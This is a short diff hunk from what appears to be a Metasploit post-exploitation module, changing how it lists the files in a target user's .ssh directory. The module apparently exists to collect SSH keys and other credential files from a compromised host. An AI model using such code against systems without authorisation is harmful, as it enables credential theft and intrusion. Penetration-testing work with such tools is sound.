@@ -128,8 +128,7 @@ class MetasploitModule < Msf::Post
     return [] if ssh_base == ''
 
     # List all the files under .ssh/
-    vprint_status("Execute: /bin/ls -a #{ssh_base}")
-    files = cmd_exec("/bin/ls -a #{ssh_base}").chomp.split()
+    files = execute("/bin/ls -a #{ssh_base}").chomp.split()
 
     files.each do |k|
       next if k =~/^(\.+)$/
